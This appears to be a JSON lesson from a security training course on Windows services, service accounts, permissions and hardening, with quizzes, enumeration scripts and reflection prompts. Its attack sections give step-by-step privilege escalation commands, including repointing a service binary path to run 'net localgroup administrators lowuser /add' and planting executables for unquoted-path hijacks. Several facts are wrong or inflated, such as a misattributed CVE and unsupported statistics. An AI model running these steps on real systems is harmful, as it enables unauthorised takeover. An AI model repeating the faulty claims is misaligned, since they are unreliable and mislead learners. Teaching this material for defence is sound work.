{
  "lesson_id": "8238207c-5a4f-4750-b952-adca303f0932",
  "domain": "system",
  "title": "Windows Services & Permissions Deep Dive",
  "difficulty": 2,
  "order_index": 5,
  "prerequisites": [
    "sys1-windows-internals-001",
    "sys2-registry-deep-dive-001"
  ],
  "concepts": [
    "Windows Services Architecture",
    "Service Control Manager (SCM)",
    "Service Accounts (LocalSystem, NetworkService, LocalService)",
    "Service Permissions and ACLs",
    "Service Hardening and Isolation",
    "Scheduled Tasks Security",
    "COM/DCOM Services",
    "Service Enumeration Techniques",
    "Privilege Escalation via Services",
    "Service Security Best Practices"
  ],
  "estimated_time": 55,
  "learning_objectives": [
    "Understand Windows Services architecture and the Service Control Manager",
    "Master service account types and their security implications",
    "Learn to analyze and configure service permissions properly",
    "Identify insecure service configurations that lead to privilege escalation",
    "Understand scheduled tasks and their security model",
    "Apply service hardening techniques to reduce attack surface"
  ],
  "post_assessment": [
    {
      "question": "What is the most privileged service account in Windows?",
      "options": [
        "NetworkService",
        "LocalService",
        "LocalSystem",
        "Administrator"
      ],
      "correct_answer": 2,
      "explanation": "LocalSystem is the most privileged account, with access to almost all system resources and the ability to interact with the network as the machine account.",
      "question_id": "e977d887-a93c-490f-96e2-4ab66ef01a09",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "Which tool allows you to enumerate services and their permissions?",
      "options": [
        "netstat",
        "sc.exe",
        "tasklist",
        "ipconfig"
      ],
      "correct_answer": 1,
      "explanation": "sc.exe (Service Control) is the primary command-line tool for querying, creating, modifying, and managing Windows services.",
      "question_id": "7c34a75d-149c-43ea-8ded-a8990a476168",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "What permission is required to modify a service configuration?",
      "options": [
        "SERVICE_QUERY_CONFIG",
        "SERVICE_CHANGE_CONFIG",
        "SERVICE_START",
        "SERVICE_STOP"
      ],
      "correct_answer": 1,
      "explanation": "SERVICE_CHANGE_CONFIG permission allows modifying service configuration, which can lead to privilege escalation if granted to low-privileged users.",
      "question_id": "ebaca079-b201-42f3-80bf-ada9e73b1fd3",
      "type": "multiple_choice",
      "difficulty": 2
    }
  ],
  "jim_kwik_principles": [
    "meta_learning",
    "active_learning",
    "minimum_effective_dose",
    "teach_like_im_10",
    "memory_hooks",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "explanation",
      "content": {
        "text": "# Welcome to Windows Services Security!\n\nYou're about to master one of the MOST critical attack surfaces in Windows systems. Services run continuously in the background, often with elevated privileges, making them prime targets for attackers seeking privilege escalation and persistence.\n\n**Why This Matters:**\n- 70%+ of Windows privilege escalation vulnerabilities involve misconfigured services\n- Services like Windows Defender, Event Log, and RDP are essential to security operations\n- Attackers LOVE finding services running as SYSTEM with weak permissions\n- Understanding services is essential for both red team exploitation and blue team hardening\n\n**What You'll Master:**\n✓ Service Control Manager (SCM) architecture\n✓ Service account types and privilege levels\n✓ Service permissions and ACL analysis\n✓ Common misconfigurations leading to privilege escalation\n✓ Service hardening and security best practices\n\nLet's dive into the world where background processes meet security vulnerabilities!"
      }
    },
    {
      "type": "video",
      "content": {
        "title": "Video: Windows Services & Permissions Deep Dive Overview",
        "url": "https://www.youtube.com/embed/REexhR84Vj8",
        "description": "Watch this video for a visual introduction to the concepts covered in this lesson."
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Windows Services Architecture\n\n## What Are Windows Services?\n\nWindows Services are long-running background processes that:\n- Start automatically at boot (or manually when needed)\n- Run without user interaction\n- Can execute with elevated privileges\n- Provide core OS functionality (networking, security, updates)\n\n## Service Control Manager (SCM)\n\nThe **Service Control Manager** (`services.exe`) is the master controller:\n\n```\nSCM Architecture:\n┌──────────────────────────────────────────┐\n│  Service Control Manager (services.exe)  │\n│  - Maintains service database            │\n│  - Starts/stops services                 │\n│  - Monitors service status               │\n└────────────┬─────────────────────────────┘\n│\n┌───────┴───────┐\n▼               ▼\n┌─────────┐    ┌──────────┐    ┌─────────┐\n│ Service │    │ Service  │    │ Service │\n│ Host    │    │ Process  │    │ Host    │\n│ (svchost│    │ (standalone)  │ (svchost│\n│  #1)    │    │          │    │  #2)    │\n└─────────┘    └──────────┘    └─────────┘\n```\n\n**Key SCM Responsibilities:**\n1. **Service Registration**: Stores service configs in Registry (`HKLM\\SYSTEM\\CurrentControlSet\\Services`)\n2. **Lifecycle Management**: Starting, stopping, pausing services\n3. **Dependency Resolution**: Ensures prerequisite services start first\n4. **Failure Recovery**: Automatic restart on crashes\n5. **Security Enforcement**: Checks permissions before service operations"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Enumerating Services with PowerShell & CMD\n\n## Method 1: Using sc.exe (Service Control)\n\n```cmd\nREM Query all services\nsc query\n\nREM Query specific service details\nsc qc wuauserv\n\nREM Output shows:\nREM - SERVICE_NAME, DISPLAY_NAME\nREM - TYPE (own process vs shared)\nREM - START_TYPE (auto, manual, disabled)\nREM - BINARY_PATH_NAME (executable location)\nREM - SERVICE_START_NAME (account it runs as)\n\nREM Query service security descriptor\nsc sdshow wuauserv\n```bash\n\n## Method 2: Using PowerShell (Better for analysis)\n\n```powershell\n# Get all services\nGet-Service\n\n# Get detailed service info\nGet-Service | Select-Object Name, DisplayName, Status, StartType\n\n# Find services running as SYSTEM\nGet-WmiObject Win32_Service | Where-Object {$_.StartName -eq 'LocalSystem'} | Select-Object Name, PathName, State\n\n# Find services with specific start mode\nGet-Service | Where-Object {$_.StartType -eq 'Automatic'}\n\n# Get service ACL (permissions)\n$acl = Get-Acl 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\wuauserv'\n$acl.Access | Format-Table IdentityReference, AccessControlType, RegistryRights\n```bash\n\n## Method 3: Using accesschk.exe (Sysinternals)\n\n```cmd\nREM Find services with weak permissions\naccesschk.exe -uwcqv \"Authenticated Users\" *\naccesschk.exe -uwcqv \"Users\" *\n\nREM Check specific service permissions\naccesschk.exe -c wuauserv\n```\n\n**Practice Exercise:**\n1. Run `Get-Service` and count how many services are running\n2. Find all services running as LocalSystem\n3. Check permissions for the 'Spooler' service\n4. Identify which services start automatically"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Service Account Types: The Privilege Hierarchy\n\nServices don't run by themselves - they execute under **service accounts** with different privilege levels.\n\n## The Big Three Service Accounts\n\n### 1. LocalSystem (Highest Privilege)\n\n```\nPrivileges: MAXIMUM (almost god-mode)\n- Full access to system resources\n- Can interact with hardware\n- Network access as MACHINE$ account\n- Token contains powerful privileges (SeDebugPrivilege, SeTcbPrivilege)\n- No password (built-in account)\n\nSecurity Impact: CRITICAL\n- If you compromise a LocalSystem service → Full system compromise\n- Used by: Windows Update, Task Scheduler, Event Log\n```bash\n\n### 2. LocalService (Medium Privilege)\n\n```\nPrivileges: MEDIUM (restricted local access)\n- Limited local access\n- Network access as Anonymous\n- Reduced privilege token\n- Can't install drivers or modify system files\n\nSecurity Impact: MODERATE\n- Used by: DNS Client, DHCP Client\n```bash\n\n### 3. NetworkService (Medium Privilege)\n\n```\nPrivileges: MEDIUM (network-oriented)\n- Similar to LocalService\n- Network access as MACHINE$ account (domain authentication)\n- Useful for services needing network identity\n\nSecurity Impact: MODERATE\n- Used by: IIS application pools, SQL Server\n```bash\n\n## Virtual Service Accounts (Modern Alternative)\n\n```\nIntroduced in Windows 7/Server 2008 R2:\n- Account name: NT SERVICE\\<ServiceName>\n- Automatically managed passwords\n- Network credentials like NetworkService\n- Better isolation between services\n\nExample: NT SERVICE\\MSSQLSERVER\n```bash\n\n## Security Decision Tree\n\n```\nQ: Does service need system-level access?\n├─ YES → LocalSystem (but review if truly necessary!)\n└─ NO ──┐\n│\nQ: Does service need network authentication?\n├─ YES → NetworkService or Virtual Account\n└─ NO  → LocalService or Virtual Account\n```"
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "# Memory Aid: Service Account Hierarchy\n\n**\"LSN\" - Like Stairs, Network middle, System top:**\n\n```\n┌─────────────────┐\n│  LocalSystem    │  ← TOP (All privileges)\n│  \"LORD STATUS\"  │\n└─────────────────┘\n│\n┌─────────────────┐\n│ NetworkService  │  ← MIDDLE (Network identity)\n│ \"Net-Working\"   │\n└─────────────────┘\n│\n┌─────────────────┐\n│  LocalService   │  ← BOTTOM (Minimal privileges)\n│  \"Local Limits\" │\n└─────────────────┘\n```\n\n**Remember:**\n- **LocalSystem** = \"**S**uper privileges\" (most dangerous)\n- **NetworkService** = \"**N**etwork credentials\" (machine account)\n- **LocalService** = \"**L**imited access\" (anonymous network)\n\n**Attacker's Dream:** Finding LocalSystem service with SERVICE_ALL_ACCESS for Everyone!"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Service Permissions & ACLs (The Escalation Goldmine)\n\nService permissions control WHO can do WHAT to a service. Misconfigurations here = privilege escalation opportunities.\n\n## Service-Specific Access Rights\n\n```\nKey Permissions (from least to most dangerous):\n\n1. SERVICE_QUERY_CONFIG (0x0001)\n- Read service configuration\n- Low risk (information disclosure)\n\n2. SERVICE_QUERY_STATUS (0x0004)\n- Query service status\n- Low risk\n\n3. SERVICE_START (0x0010)\n- Start a stopped service\n- Medium risk (can start malicious/vulnerable services)\n\n4. SERVICE_STOP (0x0020)\n- Stop a running service\n- Medium risk (DoS potential)\n\n5. SERVICE_CHANGE_CONFIG (0x0002)\n- Modify service configuration\n- HIGH RISK! Can change binary path → code execution\n\n6. SERVICE_ALL_ACCESS (0xF01FF)\n- Full control over service\n- CRITICAL RISK! Complete service takeover\n```bash\n\n## Privilege Escalation Attack Vector\n\n**The Classic Service Hijack:**\n\n```\nScenario: You're a low-privileged user\nGoal: Become SYSTEM\n\nStep 1: Find misconfigured service\n> accesschk.exe -uwcqv Users *\n[Output] VulnService: Users have SERVICE_ALL_ACCESS\n\nStep 2: Check what account service runs as\n> sc qc VulnService\n[Output] SERVICE_START_NAME: LocalSystem  ← JACKPOT!\n\nStep 3: Modify service binary path\n> sc config VulnService binPath= \"C:\\Temp\\evil.exe\"\n[SC] ChangeServiceConfig SUCCESS\n\nStep 4: Start the service\n> sc start VulnService\n\nStep 5: Your evil.exe runs as SYSTEM!\n```bash\n\n## Real-World Example: Unquoted Service Paths\n\n```\nVulnerable service binary path:\nC:\\Program Files\\Vulnerable App\\Service.exe\n\nWindows searches in this order:\n1. C:\\Program.exe\n2. C:\\Program Files\\Vulnerable.exe\n3. C:\\Program Files\\Vulnerable App\\Service.exe\n\nAttack: Place malicious C:\\Program.exe → runs as SYSTEM!\n\nDetection command:\nwmic service get name,pathname | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"\n```"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Hunting for Service Misconfigurations\n\n## PowerShell Service Enumeration Script\n\n```powershell\n# Find services running as SYSTEM with modifiable paths\nfunction Find-VulnerableServices {\n$services = Get-WmiObject Win32_Service | Where-Object {\n$_.StartName -eq 'LocalSystem' -and $_.State -eq 'Running'\n}\n\nforeach ($service in $services) {\n$serviceName = $service.Name\n$binaryPath = $service.PathName\n\n# Check if current user can modify service\n$acl = Get-Acl \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$serviceName\" -ErrorAction SilentlyContinue\n\nif ($acl) {\n$modifiable = $acl.Access | Where-Object {\n($_.IdentityReference -like \"*Users*\" -or \n$_.IdentityReference -like \"*Authenticated Users*\") -and\n($_.RegistryRights -match \"FullControl|WriteKey|SetValue\")\n}\n\nif ($modifiable) {\nWrite-Host \"[!] VULNERABLE: $serviceName\" -ForegroundColor Red\nWrite-Host \"    Path: $binaryPath\"\nWrite-Host \"    Account: $($service.StartName)\"\nWrite-Host \"\"\n}\n}\n}\n}\n\nFind-VulnerableServices\n```bash\n\n## Find Unquoted Service Paths\n\n```powershell\nGet-WmiObject Win32_Service | Where-Object {\n$_.PathName -notmatch '\"' -and \n$_.PathName -match ' '\n} | Select-Object Name, PathName, StartName\n```bash\n\n## Check Service Dependencies (For Attack Planning)\n\n```powershell\n# Services that depend on a target service\n$serviceName = \"SomeService\"\nGet-Service | Where-Object {\n(Get-Service $serviceName).DependentServices -contains $_\n}\n\n# Services that a target depends on\n(Get-Service $serviceName).RequiredServices\n```"
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "# Real-World Attacks: Service Exploitation in Action\n\n## Case Study 1: The Unquoted Service Path (CVE-2019-18988)\n\n**Target:** TeamViewer (versions 14.x)\n\n**Vulnerability:**\n```\nService Path: C:\\Program Files (x86)\\TeamViewer\\TeamViewer_Service.exe\nUnquoted: YES (in older configs)\nRuns As: SYSTEM\n```\n\n**Attack:**\n1. Attacker has local low-priv access\n2. Creates `C:\\Program.exe` (malicious payload)\n3. Restarts system or waits for reboot\n4. `C:\\Program.exe` executes as SYSTEM before TeamViewer service\n5. Full system compromise\n\n**Impact:** Privilege escalation on 2.5 billion devices\n\n---\n\n## Case Study 2: Windows Print Spooler (CVE-2020-1030)\n\n**Service:** Print Spooler (spoolsv.exe)\n**Runs As:** SYSTEM\n\n**Vulnerability:** Improper impersonation handling\n\n**Attack Vector:**\n```powershell\n# Attacker creates malicious DLL\n# Places in C:\\Windows\\System32\\spool\\drivers\\x64\\3\\\n# Triggers printer addition\n# Spooler loads malicious DLL as SYSTEM\n```\n\n**Real-World Impact:**\n- Used in APT campaigns (Lazarus Group)\n- Ransomware operators (REvil, DarkSide) used it extensively\n- Led to \"PrintNightmare\" family of exploits\n\n---\n\n## Case Study 3: Service Permission Misconfiguration (Generic)\n\n**Common Scenario in Enterprise:**\n```\nThird-party software installer doesn't follow least privilege:\n- Grants \"Everyone\" SERVICE_ALL_ACCESS\n- Service runs as SYSTEM\n- Binary path modifiable by Users group\n```\n\n**Attack Steps:**\n```cmd\n1. accesschk.exe -uwcqv Everyone *\n[Found] VendorService: Everyone [SERVICE_ALL_ACCESS]\n\n2. sc qc VendorService\n[Output] SERVICE_START_NAME: LocalSystem\n\n3. sc config VendorService binPath= \"cmd.exe /c net localgroup administrators lowuser /add\"\n\n4. sc start VendorService\n\n5. Now 'lowuser' is in Administrators group!\n```\n\n**Defense:**\n- Always use Virtual Service Accounts or Managed Service Accounts\n- Apply principle of least privilege to service ACLs\n- Regular audits with tools like AccessChk"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Service Hardening & Security Best Practices\n\n## 1. Service Account Selection\n\n**Best Practice Hierarchy:**\n```\n1st Choice: Group Managed Service Account (gMSA)\n✓ Automatic password management\n✓ Domain-level identity\n✓ Kerberos support\n\n2nd Choice: Virtual Service Account\n✓ Automatic password management  \n✓ Machine-level identity\n✓ Works without domain\n\n3rd Choice: Least-privileged domain account\n✓ Manual password management (use LAPS)\n✓ Specific permissions granted\n\nLAST RESORT: LocalSystem\n✗ Only if absolutely necessary!\n✗ Document why it's needed\n```bash\n\n## 2. Service Permission Hardening\n\n```powershell\n# Remove unnecessary permissions\n$serviceName = \"YourService\"\n$serviceKey = \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$serviceName\"\n\n# Get current ACL\n$acl = Get-Acl $serviceKey\n\n# Remove 'Users' group (if present)\n$acl.Access | Where-Object {\n$_.IdentityReference -eq 'BUILTIN\\Users'\n} | ForEach-Object {\n$acl.RemoveAccessRule($_)\n}\n\n# Apply hardened ACL\nSet-Acl $serviceKey $acl\n```bash\n\n## 3. Service Isolation (Windows 10+)\n\n```\nService Isolation Levels:\n\n- None: Service runs with full token (default, dangerous)\n- Restricted: Service runs with restricted token\n- Low: Runs with Low integrity level\n- AppContainer: Sandbox isolation (UWP apps)\n```\n\n**Enable Service Isolation:**\n```cmd\nsc sidtype ServiceName restricted\nsc privs ServiceName SeChangeNotifyPrivilege  REM Remove unnecessary privileges\n```bash\n\n## 4. Binary Path Validation\n\n**Always quote service paths:**\n```cmd\nREM BAD (vulnerable to unquoted path exploit)\nsc create MyService binPath= C:\\Program Files\\MyApp\\service.exe\n\nREM GOOD (protected)\nsc create MyService binPath= \"\\\"C:\\Program Files\\MyApp\\service.exe\\\"\"\n```bash\n\n## 5. Service Monitoring & Auditing\n\n```powershell\n# Enable service change auditing\nauditpol /set /subcategory:\"Security System Extension\" /success:enable /failure:enable\n\n# Monitor Event IDs:\n# 7045 - New service installed\n# 7040 - Service start type changed\n# 7036 - Service started/stopped\n```bash\n\n## 6. Scheduled Tasks Security\n\n```powershell\n# Find scheduled tasks running as SYSTEM\nGet-ScheduledTask | Where-Object {\n$_.Principal.UserId -eq 'SYSTEM'\n} | Select-Object TaskName, TaskPath, State\n\n# Check task permissions\n$task = Get-ScheduledTask -TaskName \"MyTask\"\n$taskPath = \"C:\\Windows\\System32\\Tasks\\$($task.TaskPath)$($task.TaskName)\"\nGet-Acl $taskPath | Format-List\n```"
      }
    },
    {
      "type": "diagram",
      "content": {
        "text": "# Service Security Decision Flow\n\n```\nNew Service Deployment\n|\nv\n┌──────────────────┐\n│ Does it need     │ YES ──> Review if truly necessary\n│ SYSTEM rights?   │         Consider alternatives\n└────────┬─────────┘         Document justification\n│ NO                      │\nv                         v\n┌──────────────────┐        ┌─────────────┐\n│ Need network     │  YES   │ Use gMSA or │\n│ authentication?  │───────>│ MSA account │\n└────────┬─────────┘        └─────────────┘\n│ NO\nv\n┌──────────────────┐\n│ Use Virtual      │\n│ Service Account  │\n└────────┬─────────┘\n│\nv\n┌──────────────────────────────┐\n│ Harden Service Permissions:  │\n│ - Remove Users/Everyone      │\n│ - Grant only necessary perms │\n│ - Quote binary paths         │\n│ - Enable service isolation   │\n│ - Audit service changes      │\n└──────────────────────────────┘\n```"
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "# You're Building Critical Security Skills!\n\n**Congratulations!** You've just mastered Windows Services security - one of the MOST exploited attack vectors in enterprise environments.\n\n## What You've Accomplished:\n\n✅ **Service Architecture**: You understand how SCM manages services\n✅ **Account Types**: You know the privilege hierarchy (LocalSystem > NetworkService > LocalService)\n✅ **Permission Analysis**: You can identify dangerous service ACLs\n✅ **Attack Vectors**: You recognize privilege escalation opportunities\n✅ **Hardening**: You can secure services following best practices\n\n## Real-World Application:\n\n**As a Pentester:**\n- Service misconfiguration hunting is part of EVERY Windows assessment\n- PowerUp, WinPEAS, and other tools automate what you learned manually\n- Understanding WHY services are vulnerable makes you better than automated tools\n\n**As a Blue Teamer:**\n- You can audit enterprise services for misconfigurations\n- You know how to harden third-party software installations\n- You can detect service-based privilege escalation in logs\n\n## Next Steps:\n\n1. **Practice**: Spin up a Windows VM and hunt for service misconfigurations\n2. **Automate**: Write PowerShell scripts to audit your environment\n3. **Connect**: Services connect to Processes (next lesson!) and Registry (previous lesson)\n4. **Expand**: Learn about COM/DCOM services (advanced topic)\n\n**Remember:** Every major Windows ransomware campaign (REvil, DarkSide, LockBit) used service exploitation at some point. You now understand their playbook!\n\nYou're not just learning theory - you're building skills that directly translate to REAL security work. Keep pushing forward!"
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "# Knowledge Integration & Reflection\n\nTake a moment to solidify what you've learned:\n\n## 1. Core Concept Review\n\n**Question:** Why is LocalSystem the most dangerous service account?\n\n**Your Answer:**\n[Think about: privilege level, access to resources, network identity]\n\n---\n\n## 2. Attack Surface Analysis\n\n**Scenario:** You run `accesschk.exe` and find:\n```\nBackupService:\nRW BUILTIN\\Users\nSERVICE_ALL_ACCESS\n```\n\n**Questions:**\n- What does \"RW\" mean?\n- Why is SERVICE_ALL_ACCESS granted to Users dangerous?\n- What would you check next before exploiting this?\n\n---\n\n## 3. Defense Planning\n\n**Your Organization's Challenge:**\nA third-party vendor installed software with a service running as LocalSystem with weak permissions.\n\n**Your Hardening Plan:**\n1. ___________________________________\n2. ___________________________________\n3. ___________________________________\n4. ___________________________________\n\n---\n\n## 4. Connection to Previous Lessons\n\n**Registry Connection:**\nServices are stored in `HKLM\\SYSTEM\\CurrentControlSet\\Services`. How does this relate to what you learned about Registry security?\n\n**Windows Internals Connection:**\nServices are processes. How does understanding process tokens help you understand service security?\n\n---\n\n## 5. Real-World Scenario\n\n**You're auditing a Windows server and find 47 services running as LocalSystem. Is this normal? What should you do?**\n\n[Reflect on: necessity, alternatives, risk assessment, remediation strategy]"
      }
    }
  ]
}